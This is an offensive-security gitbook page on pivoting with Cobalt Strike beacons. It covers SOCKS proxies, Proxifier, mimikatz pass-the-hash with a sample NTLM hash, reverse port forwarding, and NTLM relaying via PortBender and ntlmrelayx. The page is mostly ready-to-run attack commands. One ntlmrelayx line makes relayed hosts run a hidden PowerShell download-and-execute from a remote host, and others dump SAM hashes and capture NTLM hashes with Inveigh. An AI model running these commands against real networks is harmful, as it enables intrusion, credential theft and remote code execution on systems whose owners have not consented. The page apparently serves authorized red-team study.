---
title: Pivoting
category: Red Team
order: 10
---

Pivoting are post-explotaiton techniques that allows us to access to the network where we have just landed.

# SOCKS Proxies

A SOCKS (Secure Socket) Proxy exchanges network packets between a client and a server via a "proxy".

It's very useful when we need to leverage with others toolsets that are only available in linux such as impacket.

> **Note**: The port will binding on the Team Server.

To start a socks proxy we can use:

* SOCKS4:
```
beacon> socks [port]
```
* SOCKS5 with password:
```
beacon> socks [post] socks5 disableNoAuth [socks_user] [socks_password] enableLogging
```

Finally we can access it with `proxychains`, but first we need to configure `/etc/proxychains.conf` file.

* SOCKS4:
```
socks4 127.0.0.1 [port]
```
* SOCKS5 with password:
```
socks5 127.0.0.1 [port] [socks_user] [socks_password]
```

```
proxychains -q [command] [arguments]
```

# Windows Apps

It is also possible to tunnel Windows GUI apps using `proxifier`.

* [https://www.proxifier.com/](https://www.proxifier.com/)

With Proxifier we can specify which application we want to tunneling.

To use Windows authentication via a proxy, the application needs to be launched as a user from the target domain.

```
runas /netonly /user:CORP\user C:\Tools\program.exe`
```

It can also be achieved with `mimikatz`.

```
mimikatz # privilege::debug
mimikatz # sekurlsa::pth /domain:DEV /user:bfarmer /ntlm:4ea24377a53e67e78b2bd853974420fc /run:mmc.exe
```

Or we can use powershell credentials:

```powershell
$cred = Get-Credential
Get-ADComputer -Server 10.10.10.10 -Credential $cred
```

# Port Forwarding

I will not explain what is a port forwarding since is detailed on `Post-Exploitation` section on this gitbook, but we will discuss how to execute it from Cobalt Strike.

```
beacon> rportfwd 8080 10.10.10.10 80
[+] started reverse port forward on 8080 to 10.10.10.10:80
```

To stop the forwarding:

```
beacon> rportfw stop 8080
```

> **Notes**:
> * Beacon's reverse port forward always tunnels the traffic to the Team Server and the Team Server sends the traffic to its intended destintation.
> * The traffic is tunnelled inside the Beacon's C2 traffic, not over separate sockets.
> * You don't need to be a local admin to create reverse port forwards on high ports.

`rportfwd_local` will tunnel the traffic to the machine running Cobalt Strike client instead of the Team Server.

```
beacon> rportfwd_local 443 127.0.0.1 443
[+] started reverse port forward on 443 to mvc1009 -> 127.0.0.1:443
```

> **Alert**: Be careful, you must create an allow rule before running a reverse port forward.
>
> `beacon> powershell New-NetFirewallRule -DisplayName "Test Rule" -Profile Domain -Direction Inbound -Action Allow -Protocol TCP -LocalPort 8080`
> `beacon> powershell Remove-NetFirewallRule -DisplayName "Test Rule"`

# NTLM Relaying

During an on-premise assessments, NTLM relaying with tools like `responder` and `ntlmrelayx` is quite trivial. However in red team assessment, is not quite trivial because port 445 is always bound and in use by Windows machines.

It's still possible with Cobalt Strike, but requires the use of multiple capabilities.

1. Use a driver `WinDivert` to redirect traffic destinated for port 445 to another port (4445). It requires local admin access in order for loading the driver. Upload the driver to `C:\Windows\System32\drivers` since this is where most windows drivers go.

```
beacon> cd C:\Windows\System32\drivers
beacon> upload C:\Tools\PortBender\WinDivert64.sys
```
 * PortBender: [https://github.com/praetorian-inc/PortBender](https://github.com/praetorian-inc/PortBender)

Load `PortBender.cna` aggressor script and redirect the traffic.

```
beacon> PortBender redirect 445 4445
```

2. Create a reverse port forwarding that will then relay the traffic from port 4445 to port 445 on the Team Server where `ntlmrelayx` will be waiting.

```
beacon> rportfwd 4445 127.0.0.1 445
```

3. A SOCKS proxy is required to allow `ntlmrelayx` to send traffic back into the network.

```
beacon> socks 5566
```

4. Finally on the Team Server execute the `ntlmrelayx` tool, by default will execute `secretsdump` to dump local SAM hashes on the target machine.

```
proxychains -q python3 /usr/local/bin/ntlmrelayx.py -t smb://<target-ip> -smb2support --no-http-server --no-wcf-server
```

Instead of dumping SAM we can execute payloads such as beacons.

```
proxychains -q python3 /usr/local/bin/ntlmrelayx.py -t smb://<target-ip> -smb2support --no-http-server --no-wcf-server -c 'powershell -nop -w hidden -c "IEX(New-Object Net-WebClient).DownloadString(\"http://10.10.10.10/a\")"'
```

To stop `PortBender` just kill the process.

```
beacon> jobs
[*] Jobs

 JID  PID   Description
 ---  ---   -----------
 0    1240  PortBender

beacon> jobkill 0
beacon> kill 1240
```

# NTLM Capturing

We can use `Inveigh` to listen to incoming requests, similar to `Responder` but in .NET.

* [https://github.com/Kevin-Robertson/Inveigh](https://github.com/Kevin-Robertson/Inveigh)

`Inveigh` should be run as a local admin.

```
beacon> execute-assembly C:\Tools\Inveigh.exe -DNS N -LLMNR N -LLMNRv6 N -HTTP N -FileOutput N
```

It it also possible use the WinDivert, rportfwd and smbserver to capture the NetTLMHash.
